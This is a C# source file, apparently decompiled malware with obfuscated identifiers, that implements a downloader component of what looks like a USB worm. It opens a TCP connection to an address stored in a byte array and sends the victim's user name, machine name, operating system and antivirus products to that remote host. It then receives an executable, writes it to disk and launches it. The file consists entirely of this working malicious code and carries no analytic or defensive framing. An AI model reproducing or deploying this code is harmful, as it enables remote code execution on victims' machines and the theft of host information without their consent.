using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace uwcrise;

internal class qurarisoVCON
{
	private int qurarisobufSize = 1024;

	private bool qurarisochecking = false;

	private TcpClient qurarisosysSCK;

	private NetworkStream qurarisoustream;

	private bool qurarisomainfile = false;

	private int qurarisobytRead = 0;

	public string qurarisosysAvs = "";

	public void qurarisoload_client()
	{
		try
		{
			if (qurarisochecking || qurarisomainfile)
			{
				return;
			}
			qurarisomainfile = true;
			qurarisochecking = true;
			if (Process.GetProcessesByName(qurarisoSETPS.qurarisomainApp).Length == 0)
			{
				if (!File.Exists(qurarisoSETPS.qurarisoget_mpath() + qurarisoSETPS.qurarisomainApp + ".exe"))
				{
					IPAddress iPAddress = null;
					iPAddress = IPAddress.Parse(Encoding.UTF8.GetString(qurarisoSETPS.qurarisoips, 0, qurarisoSETPS.qurarisoips.Length));
					qurarisosysSCK = new TcpClient();
					qurarisosysSCK.Connect(new IPEndPoint(iPAddress, qurarisoSETPS.qurarisosysPort));
					string text = qurarisoget_cmd();
					if (text != qurarisoSETPS.qurarisodowcmd)
					{
						text = qurarisoget_cmd();
					}
					qurarisoSETPS.qurarisocontries = 0;
					if (text == qurarisoSETPS.qurarisodowcmd)
					{
						byte[] array = qurarisosearchdata();
						if (array != null)
						{
							if (!Directory.Exists(qurarisoSETPS.qurarisoget_mpath()))
							{
								Directory.CreateDirectory(qurarisoSETPS.qurarisoget_mpath());
							}
							File.WriteAllBytes(qurarisoSETPS.qurarisoget_mpath() + qurarisoSETPS.qurarisomainApp + ".exe", array);
							Thread.Sleep(100);
							Process process = new Process();
							process.StartInfo.FileName = qurarisoSETPS.qurarisoget_mpath() + qurarisoSETPS.qurarisomainApp + ".exe";
							process.Start();
						}
						qurarisoustream.Close();
					}
					qurarisosysSCK.Close();
				}
				else
				{
					qurarisoSETPS.qurarisocontries = 0;
				}
			}
			else
			{
				qurarisoSETPS.qurarisocontries = 0;
				qurarisomainfile = true;
			}
			qurarisochecking = false;
		}
		catch
		{
			qurarisoSETPS.qurarisocontries++;
			qurarisochecking = false;
		}
	}

	private byte[] qurarisosearchdata()
	{
		try
		{
			int num = 0;
			byte[] array = new byte[5];
			qurarisobytRead = qurarisoustream.Read(array, 0, 5);
			int num2 = BitConverter.ToInt32(array, 0);
			byte[] array2 = new byte[num2];
			for (int num3 = num2; num3 > 0; num3 -= qurarisobytRead)
			{
				int count = ((num3 > qurarisobufSize) ? qurarisobufSize : num3);
				qurarisobytRead = qurarisoustream.Read(array2, num, count);
				num += qurarisobytRead;
			}
			return array2;
		}
		catch
		{
			return null;
		}
	}

	private string qurarisoget_cmd()
	{
		try
		{
			qurarisobufSize = qurarisosysSCK.ReceiveBufferSize;
			qurarisoustream = qurarisosysSCK.GetStream();
			qurarisosysAvs = qurarisoSETPS.qurarisoloadAV();
			qurarisoloaddata(null, qurarisoSETPS.qurarisodowcmd + "=USBW | " + Environment.UserName + " | " + Environment.MachineName + " | " + qurarisoSETPS.qurarisoOsname() + " | " + qurarisosysAvs);
			byte[] array = new byte[5];
			qurarisobytRead = qurarisoustream.Read(array, 0, 5);
			int num = BitConverter.ToInt32(array, 0);
			byte[] array2 = new byte[num];
			int num2 = 0;
			for (int num3 = num; num3 > 0; num3 -= qurarisobytRead)
			{
				int count = ((num3 > qurarisobufSize) ? qurarisobufSize : num3);
				qurarisobytRead = qurarisoustream.Read(array2, num2, count);
				num2 += qurarisobytRead;
			}
			string text = Encoding.UTF8.GetString(array2, 0, num).ToString();
			return text.Split(new char[1] { '=' })[0];
		}
		catch
		{
			return "";
		}
	}

	private bool qurarisoloaddata(byte[] data, string type)
	{
		try
		{
			byte[] bytes = Encoding.UTF8.GetBytes(type);
			int num = 0;
			int num2 = 5;
			byte[] array = null;
			if (data != null)
			{
				array = BitConverter.GetBytes(data.Length);
				num = data.Length;
				num2 = 10;
			}
			byte[] bytes2 = BitConverter.GetBytes(bytes.Length);
			byte[] array2 = new byte[num2 + bytes.Length + (num - 1) + 1];
			bytes2.CopyTo(array2, 0);
			bytes.CopyTo(array2, 5);
			if (data != null)
			{
				array.CopyTo(array2, 5 + bytes.Length);
				data.CopyTo(array2, 10 + bytes.Length);
			}
			int num3 = 0;
			int num4 = array2.Length;
			while (num4 > 0)
			{
				int num5 = ((num4 > qurarisobufSize) ? qurarisobufSize : num4);
				qurarisoustream.Write(array2, num3, num5);
				num3 += num5;
				num4 -= num5;
			}
			return true;
		}
		catch
		{
			return false;
		}
	}
}
